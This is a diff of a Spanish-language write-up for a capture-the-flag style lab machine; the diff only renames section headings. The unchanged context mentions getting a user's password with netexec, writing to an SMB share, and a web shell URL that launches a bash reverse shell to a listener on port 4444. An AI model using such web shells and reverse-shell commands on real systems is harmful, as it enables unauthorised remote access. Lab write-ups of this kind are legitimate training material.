@@ -137,7 +137,7 @@ Lo decodificamos para ver que información podemos obtener:
 
 ![Desktop View](/20251102203131.webp){: width="972" height="589" .shadow}
 
-## explotación
+## acceso inicial (satriani7 / administrador)
 
 Parece que el token JWT pertenece al usuario `satriani7`. Tratamos de obtener la contraseña empleando `netexec`, y finalmente la obtenemos:
 
@@ -441,7 +441,7 @@ De esta manera, habremos obtenido ejecución de comandos remota como el usuario 
 
 ![Desktop View](/20251103145732.webp){: width="972" height="589" .shadow}
 
-### Opción 3 -> Acceso empleando SMB
+### Opción 3 -> Acceso empleando SMB (administrador)
 
 La tercera manera de abordar el acceso es a través de SMB, ya que sobre el recurso compartido `home` tenemos permisos de escritura:
 
@@ -497,7 +497,7 @@ Y al acceder, podemos ejecutar comandos:
 http://172.17.0.2/shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/172.17.0.1/4444 0>%261'
 ```
 
-## escalada de privilegios
+## escalada de privilegios (root)
 
 Habiendo empleado cualquiera de las anteriores alternativas para obtener una consola como el usuario `www-data`, la escalada de privilegios se obtiene de la siguiente manera:
 
